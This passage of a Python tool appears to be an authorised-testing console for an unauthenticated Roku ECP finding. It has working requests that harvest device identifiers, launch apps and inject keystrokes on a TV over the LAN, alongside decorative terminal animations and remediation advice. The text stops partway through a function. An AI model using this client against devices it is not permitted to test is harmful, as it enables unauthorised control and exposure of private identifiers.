#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
roku_ecp_console.py - Roku ECP menu console + psychedelic ASCII transitions
===========================================================================

A single-file, dependency-free (Python 3.8+ standard library only) menu console
that exercises every capability described in the finding:

    "Unauthenticated Roku ECP Interface on Port 8060 Enables Remote App Launch
     and Key Injection"  (CWE-306, CVSS 3.1 7.6, AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L)

Capabilities mapped from the report
-----------------------------------
  * GET  /query/device-info   -> full device XML + identifiers (serial, MACs,
                                 advertising-id, network-name, software version)
  * GET  /query/apps          -> installed application inventory
  * POST /launch/<appId>      -> launch an installed application
  * POST /keypress/<key>      -> single keystroke injection
  * POST /keydown/<key>       -> key held down (report lists keydown separately)
  * POST /install/<appId>     -> negative control (401 while developer mode off)
  * Host-header check         -> correct Host = 200, adversarial Host = 403,
                                 i.e. DNS-rebinding is mitigated on this device
  * Port 8060 reachability    -> nmap-equivalent TCP connect + Server banner
  * Full PoC chain            -> report reproduction steps 2-5 in one pass

Extras (clearly labelled, standard ECP, not part of the finding):
  * /query/active-app, /query/media-player, /query/tv-channels
  * literal text entry via /keypress/Lit_<char>

Transition animations
---------------------
Nine procedural psychedelic renderers (plasma, hyperspace torus, tunnel,
Mandelbrot dive, kaleidoscope, metaballs, vortex, moire, lissajous ribbons)
drawn with Unicode half-blocks at 24-bit colour.  A 3-second animation plays
on every menu selection, i.e. in the interval between one selection and the
next.  Use --anim-seconds to change the length, --256 for xterm-256 colour,
--ascii for plain ASCII rendering, --no-anim to disable.

Colour output degrades automatically: truecolor -> 256 -> ASCII when the
terminal does not advertise support (set COLORTERM=truecolor to force).

Usage
-----
    python3 roku_ecp_console.py                       # defaults to 192.168.12.223
    python3 roku_ecp_console.py 192.168.12.223
    python3 roku_ecp_console.py 192.168.12.223 --port 8060 --anim-seconds 3
    python3 roku_ecp_console.py --help

Authorised testing only: ECP is unauthenticated, so every request this tool
makes is indistinguishable from an attacker's.  Run it only against devices
you own or are explicitly permitted to test.
"""

from __future__ import annotations

import argparse
import html
import io
import math
import os
import random
import re
import shutil
import socket
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from datetime import datetime, timezone

# ---------------------------------------------------------------------------
# Constants taken from the finding
# ---------------------------------------------------------------------------

DEFAULT_TARGET = "192.168.12.223"     # TCL 55US57-W, Roku OS 16.0.4
DEFAULT_PORT = 8060
DEFAULT_ANIM_SECONDS = 3.0
TARGET_FPS = 20.0

SERVER_BANNER_EXPECTED = "Roku/"
REPORT_APP_YOUTUBE = "837"

TAU = math.pi * 2.0

# ---------------------------------------------------------------------------
# ANSI / colour plumbing
# ---------------------------------------------------------------------------

RESET = "\x1b[0m"
CLEAR = "\x1b[2J\x1b[H"
HIDE_CURSOR = "\x1b[?25l"
SHOW_CURSOR = "\x1b[?25h"

ST_DIM = "2"
ST_BOLD = "1"
ST_CYAN = "1;36"
ST_MAGENTA = "1;35"
ST_YELLOW = "1;33"
ST_GREEN = "1;32"
ST_RED = "1;31"
ST_BLUE = "1;34"
ST_WHITE = "1;37"
ST_INVERSE = "7"

_COLOR_ENABLED = True
_GLYPHS = True          # Unicode box drawing / half blocks available


def enable_windows_ansi() -> None:
    """Enable VT processing on Windows 10+ consoles."""
    if os.name != "nt":
        return
    try:
        import ctypes

        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
    except Exception:
        pass


def c(text: str, style: str = "") -> str:
    """Wrap text in an SGR sequence (no-op when colour is disabled)."""
    if not _COLOR_ENABLED or not style:
        return text
    return "\x1b[%sm%s%s" % (style, text, RESET)


def detect_capabilities(force_ascii: bool, force_256: bool, force_truecolor: bool) -> tuple:
    """Return (glyphs_ok, truecolor_ok) based on environment and flags."""
    global _GLYPHS, _COLOR_ENABLED

    encoding = (getattr(sys.stdout, "encoding", "") or "").lower().replace("-", "")
    glyphs = encoding in ("utf8", "utf16", "utf32", "cp65001")
    if force_ascii:
        glyphs = False

    colour_term = os.environ.get("COLORTERM", "").lower()
    term = os.environ.get("TERM", "").lower()
    truecolor = "truecolor" in colour_term or "24bit" in colour_term
    if sys.stdout.isatty() and term not in ("linux", "dumb", ""):
        truecolor = True           # modern terminals handle SGR 38;2 fine
    if force_truecolor:
        truecolor = True
    if force_256:
        truecolor = False

    if not sys.stdout.isatty():
        truecolor = False          # piped output: keep escape payload small

    if os.environ.get("NO_COLOR"):
        _COLOR_ENABLED = False

    _GLYPHS = glyphs
    return glyphs, truecolor


ANSI_RE = re.compile(r"\x1b\[[0-9;?]*[A-Za-z]")


def strip_ansi(text: str) -> str:
    return ANSI_RE.sub("", text)


def rule(width: int = 74, ch: str = "-") -> str:
    if _GLYPHS and ch == "-":
        ch = "\u2500"
    return ch * width


# ---------------------------------------------------------------------------
# Colour maths for the animations
# ---------------------------------------------------------------------------

def clamp01(v: float) -> float:
    return 0.0 if v < 0.0 else (1.0 if v > 1.0 else v)


def hsv(h: float, s: float, v: float) -> tuple:
    """HSV (all 0..1) -> RGB tuple of ints 0..255."""
    h = h - math.floor(h)
    s = clamp01(s)
    v = clamp01(v)
    i = int(h * 6.0) % 6
    f = h * 6.0 - math.floor(h * 6.0)
    p = v * (1.0 - s)
    q = v * (1.0 - f * s)
    t = v * (1.0 - (1.0 - f) * s)
    if i == 0:
        r, g, b = v, t, p
    elif i == 1:
        r, g, b = q, v, p
    elif i == 2:
        r, g, b = p, v, t
    elif i == 3:
        r, g, b = p, q, v
    elif i == 4:
        r, g, b = t, p, v
    else:
        r, g, b = v, p, q
    return (int(r * 255.0), int(g * 255.0), int(b * 255.0))


def quant256(rgb: tuple) -> int:
    """Rough RGB -> xterm-256 index."""
    r, g, b = rgb
    if abs(r - g) < 10 and abs(g - b) < 10:
        # greyscale ramp
        idx = 232 + min(23, int((r + g + b) / 3.0 / 255.0 * 23.0))
        return idx
    def q(v: int) -> int:
        return 0 if v < 48 else (5 if v > 238 else int((v - 35) / 40.5))
    return 16 + 36 * q(r) + 6 * q(g) + q(b)


# ---------------------------------------------------------------------------
# Animation renderers.  Each returns pix[y][x] = (r, g, b) for a grid of
# w columns by h2 pixel rows (two pixel rows per terminal cell).
# ---------------------------------------------------------------------------

def anim_plasma(w: int, h2: int, t: float, rng: random.Random) -> list:
    """Classic four-wave interference plasma with hue drift."""
    f1 = 7.0 + 2.2 * math.sin(t * 0.7)
    f2 = 6.0 + 2.0 * math.cos(t * 0.9)
    f3 = 5.0 + 1.5 * math.sin(t * 1.3 + 1.0)
    f4 = 11.0 + 4.0 * math.sin(t * 0.5)
    hue0 = t * 0.22
    pix = []
    inv_w = 1.0 / max(1, w - 1)
    inv_h = 1.0 / max(1, h2 - 1)
    for y in range(h2):
        v = y * inv_h
        sv = math.sin(v * f2 + t * 1.1)
        cv = math.cos(v * f3 - t * 0.8)
        row = []
        for x in range(w):
            u = x * inv_w
            a = math.sin(u * f1 + t * 1.5)
            b = sv
            cc = math.sin((u + v) * f3 + t * 2.0)
            d = math.sin(math.hypot(u - 0.5, v - 0.5) * f4 - t * 2.4)
            n = (a + b + cc + d) * 0.25
            val = 0.30 + 0.70 * (0.5 + 0.5 * math.sin(n * 3.0 + t * 1.2))
            row.append(hsv(hue0 + n * 0.55 + cv * 0.08, 0.88, val))
        pix.append(row)
    return pix


def anim_torus(w: int, h2: int, t: float, rng: random.Random) -> list:
    """Hue-cycling rotating torus, z-buffered point cloud."""
    pix = [[(0, 0, 0) for _ in range(w)] for _ in range(h2)]
    zbuf = [[-1.0e9 for _ in range(w)] for _ in range(h2)]

    A = t * 1.9
    B = t * 1.15
    e, g = math.sin(A), math.cos(A)
    m, n = math.cos(B), math.sin(B)

    cx, cy = w * 0.5, h2 * 0.5
    sx, sy = w * 0.30, h2 * 0.42
    hue0 = t * 0.30
    j = 0.0
    while j < TAU:
        d, fj = math.cos(j), math.sin(j)
        h = d + 2.0
        i = 0.0
        while i < TAU:
            ci, si = math.cos(i), math.sin(i)
            denom = ci * h * e + fj * g + 5.0
            if denom > 0.3:
                inv = 1.0 / denom
                tv = ci * h * g - fj * e
                x = int(cx + sx * inv * (si * h * m - tv * n) * 2.2)
                y = int(cy + sy * inv * (si * h * n + tv * m) * 2.2)
                if 0 <= x < w and 0 <= y < h2 and inv > zbuf[y][x]:
                    zbuf[y][x] = inv
                    lum = clamp01(0.35 + ((fj * e - ci * d * g) * m - ci * d * e - fj * g - si * d * n) * 0.11)
                    pix[y][x] = hsv(hue0 + (i / TAU) * 0.85 + (j / TAU) * 0.15, 0.95, 0.18 + 0.82 * lum)
            i += 0.055
        j += 0.115
    return pix


def anim_tunnel(w: int, h2: int, t: float, rng: random.Random) -> list:
    """Barber-pole tunnel with a twisting rainbow throat."""
    pix = []
    cx, cy = w * 0.5, h2 * 0.5
    unit = h2 * 0.5
    for y in range(h2):
        dy = (y - cy) / unit
        row = []
        for x in range(w):
            dx = (x - cx) / unit
            r = math.hypot(dx, dy) + 1.0e-6
            a = math.atan2(dy, dx) + r * 1.6
            depth = 1.0 / r
            u = depth * 1.15 + t * 1.05
            v = a / TAU * 6.0 + t * 0.30
            band = (int(math.floor(u * 3.0)) + int(math.floor(v * 3.0))) & 1
            fog = clamp01(1.0 - r * 0.85)
            base = 0.14 + 0.86 * fog
            shade = base * (0.95 if band else 0.42)
            hue = (u * 0.09 + v * 0.05 + t * 0.25) % 1.0
            row.append(hsv(hue, 0.92, shade))
        pix.append(row)
    return pix


def anim_mandelbrot(w: int, h2: int, t: float, rng: random.Random) -> list:
    """Seahorse-point Mandelbrot, ping-pong zoom, palette rotation."""
    gw = max(18, (w + 1) // 2)
    gh = max(10, (h2 + 1) // 2)
    phase = (t * 0.22) % 1.0
    # Misiurewicz point: boundary filament, no flat interior at these depths
    depth = 7.0 + 2.5 * (0.5 - 0.5 * math.cos(TAU * phase))
    zoom = 2.0 ** -depth
    scale = 1.65 * zoom
    ccx, ccy = -0.77568377, 0.13646737
    maxit = 400
    aspect = gh / float(gw)
    hue0 = t * 0.18

    # pass 1: smooth escape counts (None = interior)
    counts = []
    vmax = 1.0
    for gy in range(gh):
        vy = ccy + ((gy / (gh - 1.0)) - 0.5) * 2.0 * scale * aspect
        row = []
        for gx in range(gw):
            vx = ccx + ((gx / (gw - 1.0)) - 0.5) * 2.0 * scale
            zx = zy = 0.0
            it = 0
            mag = 0.0
            while it < maxit:
                zx, zy = zx * zx - zy * zy + vx, 2.0 * zx * zy + vy
                mag = zx * zx + zy * zy
                it += 1
                if mag > 64.0:
                    break
            if it >= maxit:
                row.append(None)
            else:
                nu = it + 1.0 - math.log(math.log(max(1.0001, mag)) / math.log(64.0), 2.0)
                nu = max(0.0, nu)
                vmax = max(vmax, nu)
                row.append(nu)
        counts.append(row)

    # pass 2: normalise against this frame's own range so the full rainbow is used
    grid = []
    for row in counts:
        out = []
        for nu in row:
            if nu is None:
                out.append(hsv(hue0 + 0.72, 0.70, 0.10))
            else:
                # escape-contour banding: sine palette over the smooth count
                s = 0.5 + 0.5 * math.sin(nu * 0.55 + hue0 * 6.0)
                out.append(hsv(hue0 + 0.08 + s * 0.88, 0.95, 0.12 + 0.88 * s))
        grid.append(out)

    pix = []
    for y in range(h2):
        gy = min(gh - 1, int(y * gh / float(h2)))
        grow = grid[gy]
        row = []
        for x in range(w):
            gx = min(gw - 1, int(x * gw / float(w)))
            row.append(grow[gx])
        pix.append(row)
    return pix


def anim_kaleido(w: int, h2: int, t: float, rng: random.Random) -> list:
    """Six-fold mirrored kaleidoscope with beating radial bands."""
    pix = []
    cx, cy = w * 0.5, h2 * 0.5
    unit = h2 * 0.5
    segments = 6.0
    for y in range(h2):
        dy = (y - cy) / unit
        row = []
        for x in range(w):
            dx = (x - cx) / unit
            r = math.hypot(dx, dy)
            a = math.atan2(dy, dx)
            seg = (a * segments / TAU) % 1.0
            seg = abs(seg - 0.5) * 2.0
            beat = math.sin(r * 9.0 - t * 2.3) * math.sin(seg * TAU * 1.5 + t * 0.9)
            ripple = 0.45 * math.sin((r * 1.7 + seg) * 7.0 + t * 2.6)
            val = clamp01(0.45 + 0.5 * (beat + ripple))
            hue = (t * 0.22 + r * 0.45 + seg * 0.35 + beat * 0.12) % 1.0
            row.append(hsv(hue, 0.95, val))
        pix.append(row)
    return pix


def anim_metaballs(w: int, h2: int, t: float, rng: random.Random) -> list:
    """Five drifting metaballs thresholded into a rainbow field."""
    balls = []
    for k in range(5):
        px = 0.5 + 0.33 * math.sin(t * (0.62 + 0.13 * k) + k * 1.7)
        py = 0.5 + 0.33 * math.cos(t * (0.81 + 0.11 * k) + k * 2.3)
        rad = 0.075 + 0.025 * math.sin(t * 1.7 + k)
        balls.append((px, py, rad * rad))

    pix = []
    inv_w = 1.0 / max(1, w - 1)
    inv_h = 1.0 / max(1, h2 - 1)
    aspect = h2 / float(max(1, w))
    for y in range(h2):
        v = y * inv_h
        row = []
        for x in range(w):
            u = x * inv_w
            s = 0.0
            for (px, py, r2) in balls:
                dx = (u - px)
                dy = (v - py) / aspect if aspect else (v - py)
                s += r2 / (dx * dx + dy * dy + 1.0e-5)
            s = clamp01(s * 0.55)
            edge = math.sin(s * 9.0 - t * 3.0)
            hue = (t * 0.25 + s * 0.7 + edge * 0.08) % 1.0
            row.append(hsv(hue, 0.92, 0.12 + 0.88 * (s ** 0.75)))
        pix.append(row)
    return pix


def anim_vortex(w: int, h2: int, t: float, rng: random.Random) -> list:
    """Logarithmic spiral vortex with hue shearing."""
    pix = []
    cx, cy = w * 0.5, h2 * 0.5
    unit = h2 * 0.5
    for y in range(h2):
        dy = (y - cy) / unit
        row = []
        for x in range(w):
            dx = (x - cx) / unit
            r = math.hypot(dx, dy)
            a = math.atan2(dy, dx)
            s = math.sin(a * 4.0 + math.log(r + 0.07) * 5.5 - t * 3.1)
            band = 0.5 + 0.5 * s
            val = clamp01(0.10 + 0.95 * (band ** 1.6) * (1.0 - 0.55 * clamp01(r)))
            hue = (a / TAU + r * 1.35 + t * 0.18) % 1.0
            row.append(hsv(hue, 0.95, val))
        pix.append(row)
    return pix


def anim_moire(w: int, h2: int, t: float, rng: random.Random) -> list:
    """Two interfering ring lattices - classic psychedelic moire."""
    pix = []
    cx, cy = w * 0.5, h2 * 0.5
    unit = h2 * 0.5
    ax = math.cos(t * 1.3) * 0.34
    ay = math.sin(t * 1.1) * 0.34
    bx = math.cos(t * 0.9 + 1.0) * 0.30
    by = math.sin(t * 1.4 + 2.0) * 0.30
    for y in range(h2):
        dy = (y - cy) / unit
        row = []
        for x in range(w):
            dx = (x - cx) / unit
            r1 = math.hypot(dx - ax, dy - ay)
            r2 = math.hypot(dx - bx, dy - by)
            v = math.sin(r1 * 26.0 - t * 4.2) * math.sin(r2 * 23.0 + t * 3.7)
            val = clamp01(0.42 + 0.58 * v)
            hue = (t * 0.20 + r1 * 0.55 - r2 * 0.30) % 1.0
            row.append(hsv(hue, 0.90, val))
        pix.append(row)
    return pix


def anim_ribbons(w: int, h2: int, t: float, rng: random.Random) -> list:
    """Additive Lissajous ribbons with soft glow."""
    buf = [[0.0] * w for _ in range(h2)]
    for k in range(5):
        ax = 0.44 - 0.055 * k
        ay = 0.42 - 0.05 * k
        fx = 1.0 + k * 0.5
        fy = 2.0 + k * 0.4
        ph = t * (1.05 + 0.18 * k) + k * 1.3
        for s in range(200):
            u = (s / 200.0) * TAU
            px = (0.5 + ax * math.sin(fx * u + ph)) * (w - 1)
            py = (0.5 + ay * math.sin(fy * u + ph * 1.31 + 1.5708)) * (h2 - 1)
            ix, iy = int(px), int(py)
            if 0 <= ix < w and 0 <= iy < h2:
                buf[iy][ix] += 0.95
    pix = []
    for y in range(h2):
        row = []
        for x in range(w):
            v = buf[y][x]
            v += 0.5 * buf[y][x - 1] if x else 0.0
            v += 0.5 * buf[y][x + 1] if x + 1 < w else 0.0
            v += 0.28 * buf[y - 1][x] if y else 0.0
            v += 0.28 * buf[y + 1][x] if y + 1 < h2 else 0.0
            lum = clamp01(v)
            hue = (0.55 + 0.55 * lum + t * 0.13 + (y / float(h2)) * 0.22) % 1.0
            row.append(hsv(hue, 0.92, clamp01(0.10 + 0.98 * lum)))
        pix.append(row)
    return pix


ANIMATIONS = [
    ("plasma cascade", anim_plasma),
    ("hyperspace donut", anim_torus),
    ("infinite tunnel", anim_tunnel),
    ("mandelbrot dive", anim_mandelbrot),
    ("kaleidoscope bloom", anim_kaleido),
    ("metaball bloom", anim_metaballs),
    ("vortex spiral", anim_vortex),
    ("moire interference", anim_moire),
    ("lissajous ribbons", anim_ribbons),
]

ASCII_RAMP = " .,:;irsXA253hMHGS#9B&@"

_FG_CACHE = {}
_BG_CACHE = {}


def blit(pix: list, w: int, h2: int, truecolor: bool, ascii_mode: bool) -> str:
    """Convert a pixel grid into one frame of terminal text."""
    if ascii_mode or not _GLYPHS:
        ramp = ASCII_RAMP
        top = len(ramp) - 1
        lines = []
        for y in range(0, h2 - 1, 2):
            row_a = pix[y]
            row_b = pix[y + 1]
            out = []
            for x in range(w):
                r1, g1, b1 = row_a[x]
                r2, g2, b2 = row_b[x]
                lum = (0.299 * r1 + 0.587 * g1 + 0.114 * b1 +
                       0.299 * r2 + 0.587 * g2 + 0.114 * b2) / 510.0
                out.append(ramp[int(lum * top)])
            lines.append("".join(out))
        return "\n".join(lines)

    def fg(rgb: tuple) -> str:
        s = _FG_CACHE.get(rgb)
        if s is None:
            if truecolor:
                s = "\x1b[38;2;%d;%d;%dm" % rgb
            else:
                s = "\x1b[38;5;%dm" % quant256(rgb)
            _FG_CACHE[rgb] = s
        return s

    def bg(rgb: tuple) -> str:
        s = _BG_CACHE.get(rgb)
        if s is None:
            if truecolor:
                s = "\x1b[48;2;%d;%d;%dm" % rgb
            else:
                s = "\x1b[48;5;%dm" % quant256(rgb)
            _BG_CACHE[rgb] = s
        return s

    lines = []
    for y in range(0, h2 - 1, 2):
        row_a = pix[y]
        row_b = pix[y + 1]
        parts = []
        prev_f = None
        prev_b = None
        for x in range(w):
            f = fg(row_a[x])
            b = bg(row_b[x])
            if f is not prev_f:
                parts.append(f)
                prev_f = f
            if b is not prev_b:
                parts.append(b)
                prev_b = b
            parts.append("\u2580")     # upper half block
        parts.append(RESET)
        lines.append("".join(parts))
    return "\n".join(lines)


def _terminal_size() -> tuple:
    try:
        size = shutil.get_terminal_size((100, 30))
    except Exception:
        return (100, 30)
    return (max(20, size.columns), max(8, size.lines))


def play_animation(cfg, label: str = "") -> None:
    """Play one fully procedural animation for cfg.anim_seconds."""
    if not cfg.animations or cfg.anim_seconds <= 0:
        return

    rng = random.Random(cfg.rng.random() + time.time())
    name, fn = rng.choice(ANIMATIONS)
    if cfg.last_animation and name == cfg.last_animation and len(ANIMATIONS) > 1:
        name, fn = rng.choice([a for a in ANIMATIONS if a[0] != name])
    cfg.last_animation = name

    out = sys.stdout
    started = time.monotonic()
    deadline = started + cfg.anim_seconds
    step = 1.0 / TARGET_FPS
    t = 0.0
    scale = 1.0
    frame_cost = step

    out.write(HIDE_CURSOR + CLEAR)
    try:
        out.write("\x1b]0;%s\x07" % ("roku ecp :: " + name))
    except Exception:
        pass

    try:
        while True:
            now = time.monotonic()
            if now >= deadline:
                break
            cols, rows = _terminal_size()
            w = max(30, min(int(cols * scale), 150))
            hcells = max(8, min(rows - 1, 44))
            h2 = hcells * 2

            t0 = time.monotonic()
            pix = fn(w, h2, t, rng)

            # bottom cell row becomes a progress bar
            progress = clamp01((now - started) / cfg.anim_seconds)
            filled = int(progress * w)
            for x in range(w):
                if x < filled:
                    pix[h2 - 2][x] = hsv(0.55 + progress * 0.45, 0.55, 0.85)
                    pix[h2 - 1][x] = hsv(0.55 + progress * 0.45, 0.65, 0.35)
                else:
                    pix[h2 - 2][x] = (26, 18, 40)
                    pix[h2 - 1][x] = (8, 6, 14)

            frame = blit(pix, w, h2, cfg.truecolor, cfg.ascii_mode)
            out.write("\x1b[H" + frame)
            out.flush()
            frame_cost = time.monotonic() - t0

            t += step
            spare = step - (time.monotonic() - now)
            if spare > 0:
                time.sleep(spare)
            # adaptive quality: back off resolution if we cannot keep up
            if frame_cost > step * 1.5 and scale > 0.55:
                scale *= 0.88
            elif frame_cost < step * 0.45 and scale < 1.0:
                scale = min(1.0, scale * 1.06)
    except KeyboardInterrupt:
        out.write(RESET + SHOW_CURSOR + CLEAR)
        return
    finally:
        try:
            out.write(RESET + SHOW_CURSOR + CLEAR)
            out.write("\x1b]0;roku ecp console\x07")
        except Exception:
            pass


# ---------------------------------------------------------------------------
# ECP client
# ---------------------------------------------------------------------------

@dataclass
class Result:
    method: str
    path: str
    status: int
    headers: dict
    body: str
    elapsed: float
    error: str = ""

    @property
    def ok(self) -> bool:
        return self.status == 200


class RokuClient:
    """Thin unauthenticated ECP client with capture + session logging."""

    def __init__(self, host: str, port: int = DEFAULT_PORT, timeout: float = 6.0,
                 capture_dir: str = "roku_ecp_captures"):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
        self.history = []
        self.apps = []
        self.capture_dir = capture_dir
        stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log_path = "roku_ecp_session_%s.log" % stamp
        try:
            os.makedirs(capture_dir, exist_ok=True)
            with open(self.log_path, "a", encoding="utf-8") as fh:
                fh.write("# Roku ECP console session %s target=%s:%d\n"
                         % (datetime.now(timezone.utc).isoformat(), host, port))
        except OSError:
            self.log_path = ""

    # -- plumbing ---------------------------------------------------------
    def set_target(self, host: str, port: int) -> None:
        self.host = host
        self.port = port
        self.apps = []

    @property
    def base_url(self) -> str:
        return "http://%s:%d" % (self.host, self.port)

    def _log(self, line: str) -> None:
        if not self.log_path:
            return
        try:
            with open(self.log_path, "a", encoding="utf-8") as fh:
                fh.write(line + "\n")
        except OSError:
            pass

    def save_capture(self, name: str, result: Result, request_note: str = "") -> str:
        stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe = re.sub(r"[^A-Za-z0-9_.-]+", "_", name)
        path = os.path.join(self.capture_dir, "%s_%s.txt" % (stamp, safe))
        try:
            os.makedirs(self.capture_dir, exist_ok=True)
            with open(path, "w", encoding="utf-8") as fh:
                fh.write("# captured %s\n" % datetime.now(timezone.utc).isoformat())
                if request_note:
                    fh.write("# %s\n" % request_note)
                fh.write("%s %s%s HTTP/1.1\n" % (result.method, self.base_url, result.path))
                for k, v in result.headers.items():
                    fh.write("%s: %s\n" % (k, v))
                fh.write("\n%s\n" % result.body)
            return path
        except OSError:
            return ""

    def request(self, path: str, method: str = "GET", host_header: str = None,
                timeout: float = None, save_as: str = "", note: str = "") -> Result:
        url = self.base_url + path
        data = b"" if method in ("POST", "PUT") else None
        req = urllib.request.Request(url, data=data, method=method)
        req.add_header("User-Agent", "roku-ecp-console/1.0")
        if host_header is not None:
            req.add_header("Host", host_header)

        started = time.monotonic()
        status = 0
        headers = {}
        body = ""
        error = ""
        try:
            with self.opener.open(req, timeout=timeout or self.timeout) as resp:
                status = resp.status
                headers = dict(resp.headers.items())
                body = resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as exc:
            status = exc.code
            headers = dict(exc.headers.items()) if exc.headers else {}
            try:
                body = exc.read().decode("utf-8", "replace")
            except Exception:
                body = ""
        except urllib.error.URLError as exc:
            error = str(getattr(exc, "reason", exc))
        except (socket.timeout, TimeoutError):
            error = "timeout after %.1fs" % (timeout or self.timeout)
        except Exception as exc:                      # noqa: BLE001 - report anything
            error = "%s: %s" % (type(exc).__name__, exc)

        result = Result(method, path, status, headers, body,
                        time.monotonic() - started, error)
        self.history.append(result)
        self._log("%s %s %s -> %s (%.0f ms)%s" % (
            datetime.now(timezone.utc).isoformat(timespec="seconds"),
            method, path, status if status else "ERR",
            result.elapsed * 1000.0,
            (" " + error) if error else ""))
        if save_as:
            self.save_capture(save_as, result, note)
        return result

    # -- typed helpers ----------------------------------------------------
    def device_info(self, **kw2) -> Result:
        return self.request("/query/device-info", **kw2)

    def apps_query(self, **kw2) -> Result:
        return self.request("/query/apps", **kw2)

    def launch(self, app_id: str) -> Result:
        return self.request("/launch/%s" % app_id, method="POST")

    def keypress(self, key: str) -> Result:
        return self.request("/keypress/%s" % key, method="POST")

    def keydown(self, key: str) -> Result:
        return self.request("/keydown/%s" % key, method="POST")

    def keyup(self, key: str) -> Result:
        return self.request("/keyup/%s" % key, method="POST")

    def install(self, app_id: str) -> Result:
        return self.request("/install/%s" % app_id, method="POST")


# ---------------------------------------------------------------------------
# Parsing helpers
# ---------------------------------------------------------------------------

def xml_field(body: str, tag: str) -> str:
    m = re.search(r"<%s>(.*?)</%s>" % (re.escape(tag), re.escape(tag)), body, re.S)
    if not m:
        return ""
    return html.unescape(m.group(1).strip())


def parse_apps(body: str) -> list:
    """Return [(id, name, version, type), ...] from /query/apps."""
    apps = []
    for attrs, name in re.findall(r"<app\b([^>]*)>(.*?)</app>", body, re.S):
        app_id = re.search(r'id="([^"]*)"', attrs)
        version = re.search(r'version="([^"]*)"', attrs)
        app_type = re.search(r'type="([^"]*)"', attrs)
        apps.append((
            app_id.group(1) if app_id else "?",
            html.unescape(name.strip()),
            version.group(1) if version else "",
            app_type.group(1) if app_type else "",
        ))
    return apps


# ---------------------------------------------------------------------------
# Presentation helpers
# ---------------------------------------------------------------------------

def status_text(status: int, error: str = "") -> str:
    if error and not status:
        return c("no response", ST_RED)
    if status == 200:
        return c("200 OK", ST_GREEN)
    if status == 401:
        return c("401 Unauthorized", ST_YELLOW)
    if status == 403:
        return c("403 Forbidden", ST_YELLOW)
    if 200 <= status < 300:
        return c(str(status), ST_GREEN)
    if 300 <= status < 500:
        return c(str(status), ST_YELLOW)
    return c(str(status), ST_RED)


def print_header(title: str, endpoint: str = "") -> None:
    print()
    line = " %s " % title.upper()
    print(c(line.ljust(74, "\u2500"), ST_MAGENTA))
    if endpoint:
        print("  " + c(endpoint, ST_DIM))


def print_section(title: str) -> None:
    print("  " + c(title, ST_CYAN))


def kv(label: str, value: str, pad: int = 24) -> None:
    print("    %s %s" % (c(label.ljust(pad), ST_DIM), value))


def bullet(text: str, mark: str = "\u00b7") -> None:
    print("    %s %s" % (c(mark, ST_DIM), text))


def note(text: str) -> None:
    print("  " + c("\u00bb ", ST_BLUE) + c(text, ST_DIM))


def warn(text: str) -> None:
    print("  " + c("! ", ST_YELLOW) + text)


def ask(prompt: str) -> str:
    try:
        return input("  " + c(prompt, ST_CYAN)).strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return ""


def confirm(prompt: str) -> bool:
    return ask(prompt + " [y/N]: ").lower() in ("y", "yes")


def show_result(res: Result, label: str = "") -> None:
    """One-line result summary used under every action header."""
    left = c("%-4s %s" % (res.method, res.path), ST_WHITE)
    bits = ["HTTP " + status_text(res.status, res.error)]
    if res.error:
        bits.append(c(res.error, ST_RED))
    else:
        bits.append(c("%.0f ms" % (res.elapsed * 1000.0), ST_DIM))
        if res.body:
            bits.append(c("%d B" % len(res.body.encode("utf-8", "replace")), ST_DIM))
    print("  %s   %s" % (left, "  ".join(bits)))
    if label:
        print("  " + c(label, ST_DIM))


# ---------------------------------------------------------------------------
# Menu actions
# ---------------------------------------------------------------------------

REMEDIATION = [
    "Put Roku devices on a dedicated IoT/guest VLAN, isolated from trusted hosts "
    "and other VLANs by firewall rules. Never share a segment with general-purpose "
    "clients or guest Wi-Fi.",
    "Block inbound TCP/8060 to the TV at the gateway for every host except a "
    "dedicated management address (consumer routers usually need a VLAN plus an "
    "inter-VLAN deny rule).",
    "Disable ECP when it is not needed: Settings -> System -> Advanced system "
    "settings -> Control by mobile apps -> Network access -> Disabled. This removes "
    "the attack surface entirely.",
    "Disable 'Fast TV Start' if remote wake is not required, so the device is not "
    "reachable while nominally off.",
    "Monitor the LAN for POST requests to /launch/, /keypress/ and /keydown/ - "
    "these are anomalous and indicate unauthorised ECP use.",
    "Keep firmware current: Roku has hardened ECP against DNS rebinding before, and "
    "the Host-header check observed on this device is one such control.",
]


def show_interpretation(lines: list) -> None:
    if not lines:
        return
    print()
    print_section("Interpretation")
    for line in lines:
        bullet(line)


def act_device_info(cli: RokuClient, cfg) -> None:
    print_header("Device information", "GET /query/device-info   (unauthenticated)")
    res = cli.device_info(save_as="device-info.xml",
                          note="unauthenticated GET /query/device-info")
    show_result(res, "full device XML; report observed a 3719-byte body")

    if not res.ok:
        if res.status == 403:
            warn("403 - the device rejected this request. If you sent a custom Host "
                 "header, that is the documented DNS-rebinding mitigation.")
        elif res.status == 401:
            warn("401 - unexpected for device-info; ECP may be partially locked down.")
        elif res.error:
            warn("No response from %s:%d - is the device up and on this segment?"
                 % (cli.host, cli.port))
        return

    fields = [
        ("friendly-device-name", "Friendly name"),
        ("model-name", "Model"),
        ("model-number", "Model number"),
        ("vendor-name", "Vendor"),
        ("serial-number", "Serial number"),
        ("device-id", "Device ID"),
        ("udn", "UDN"),
        ("advertising-id", "Advertising ID"),
        ("software-version", "Software version"),
        ("network-name", "Network (SSID)"),
        ("wifi-mac", "Wi-Fi MAC"),
        ("ethernet-mac", "Ethernet MAC"),
        ("user-profile-type", "Profile type"),
        ("ui-resolution", "UI resolution"),
        ("screen-size", "Screen size"),
        ("model-region", "Region"),
        ("power-mode", "Power mode"),
        ("uptime", "Uptime"),
        ("is-tv", "Is TV"),
        ("supports-ethernet", "Ethernet supported"),
    ]
    values = {}
    print()
    print_section("Selected identifiers")
    for tag, label in fields:
        val = xml_field(res.body, tag)
        if val:
            values[tag] = val
            kv(label, val)

    sensitive = [k for k in ("serial-number", "advertising-id", "wifi-mac",
                             "ethernet-mac", "device-id", "udn") if k in values]
    print()
    print_section("Raw XML response")
    body_lines = res.body.splitlines()
